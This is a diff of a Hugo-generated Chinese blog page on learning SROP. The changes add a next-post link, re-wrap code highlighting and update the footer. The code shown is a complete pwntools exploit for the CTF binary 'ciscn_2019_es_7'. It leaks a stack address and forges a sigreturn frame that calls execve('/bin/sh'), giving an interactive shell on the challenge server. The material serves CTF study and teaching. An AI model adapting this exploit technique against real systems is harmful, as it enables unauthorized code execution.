@@ -20,7 +20,7 @@
 
 <meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/" /><link rel="next" href="https://liuliuliuzy.github.io/2022-03-03-susctf2022-happytree/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -243,50 +243,50 @@
 </span><span class="lnt">43
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
-<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_es_7&#39;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26270</span><span class="p">)</span>
-
-<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x400517</span>
-<span class="n">mov_rax_0x3b_ret</span> <span class="o">=</span> <span class="mh">0x4004e2</span> <span class="c1"># execve</span>
-<span class="n">mov_rax_0x0f_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span> <span class="c1"># sigreturn</span>
-<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x40051d</span>
-<span class="n">call_vuln</span> <span class="o">=</span> <span class="mh">0x400531</span>
-<span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004f1</span>
-
-<span class="c1"># first time</span>
-<span class="n">pld1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
-<span class="n">pld1</span> <span class="o">=</span> <span class="n">pld1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
-<span class="n">pld1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld1</span><span class="p">)</span>
-
-<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack_addr: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)))</span>
-
-<span class="c1"># second time</span>
-<span class="n">pld2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
-<span class="n">pld2</span> <span class="o">=</span> <span class="n">pld2</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
-<span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_0x0f_ret</span><span class="p">)</span>
-<span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
-
-<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
-<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
-<span class="c1"># print(sigframe)</span>
-
-<span class="n">pld2</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld2</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_es_7&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26270</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x400517</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_rax_0x3b_ret</span> <span class="o">=</span> <span class="mh">0x4004e2</span> <span class="c1"># execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_rax_0x0f_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span> <span class="c1"># sigreturn</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x40051d</span>
+</span></span><span class="line"><span class="cl"><span class="n">call_vuln</span> <span class="o">=</span> <span class="mh">0x400531</span>
+</span></span><span class="line"><span class="cl"><span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004f1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># first time</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld1</span> <span class="o">=</span> <span class="n">pld1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack_addr: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># second time</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld2</span> <span class="o">=</span> <span class="n">pld2</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_0x0f_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(sigframe)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pld2</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行截图</p>
 <p><figure><a class="lightgallery" href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101203955060.png" title="image-20211101203955060" data-thumbnail="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101203955060.png" data-sub-html="<h2>It works</h2><p>image-20211101203955060</p>">
@@ -333,14 +333,15 @@
         </section>
     </div>
 
-    <div class="post-nav"><a href="/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/" class="prev" rel="prev" title="10月随笔"><i class="fas fa-angle-left fa-fw"></i>10月随笔</a></div>
+    <div class="post-nav"><a href="/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/" class="prev" rel="prev" title="10月随笔"><i class="fas fa-angle-left fa-fw"></i>10月随笔</a>
+            <a href="/2022-03-03-susctf2022-happytree/" class="next" rel="next" title="Susctf2022 Happytree">Susctf2022 Happytree<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="valine" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
